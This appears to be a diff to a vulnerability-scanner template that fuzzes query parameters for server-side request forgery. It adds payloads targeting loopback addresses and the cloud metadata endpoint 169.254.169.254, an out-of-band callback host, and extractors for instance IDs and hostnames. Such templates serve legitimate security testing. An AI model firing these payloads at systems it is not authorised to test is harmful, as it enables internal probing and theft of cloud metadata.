@@ -1,10 +1,10 @@
 id: fuzz-ssrf-redirect
 
 info:
-  name: SSRF via URL Redirect
+  name: SSRF via URL Injection (Redirect & Metadata)
   author: openai
   severity: high
-  tags: ssrf,dast,redirect
+  tags: ssrf,fuzzing,oob,redirect,cloud,dast
 
 http:
   - method: GET
@@ -12,22 +12,55 @@ http:
       - "{{BaseURL}}"
 
     payloads:
-      redirect:
+      ssrf:
         - "http://127.0.0.1:80"
+        - "http://127.0.0.1:8000"
+        - "http://127.0.0.1:8080"
         - "http://localhost"
+        - "http://0.0.0.0"
         - "http://169.254.169.254"
         - "http://169.254.169.254/latest/meta-data/"
-        - "http://0.0.0.0"
+        - "http://[::1]"
         - "http://127.1.2.3"
+        - "http://{{interactsh-url}}"
 
     fuzzing:
       - part: query
         mode: multiple
         fuzz:
-          - "{{redirect}}"
+          - "{{ssrf}}"
 
+    stop-at-first-match: false
+    redirects: true
     matchers:
-      - type: regex
+      - type: word
         part: header
+        words:
+          - "169.254"
+          - "127.0.0.1"
+          - "localhost"
+          - "{{interactsh-url}}"
+        condition: or
+
+      - type: regex
+        part: body
         regex:
-          - "Location:.*(127|169\\.254)"
+          - "(?i)(EC2|meta-data|hostname|instance-id|root)"
+          - "(127\\.0\\.0\\.1|169\\.254\\.169\\.254|localhost|internal)"
+          - "(Connection refused|Unexpected error|Connection timed out)"
+        condition: or
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(i-[a-z0-9]{8,})"
+          - "(ami-[a-z0-9]{8,})"
+          - "(?:instance-id|hostname):?\\s*([\\w.-]+)"
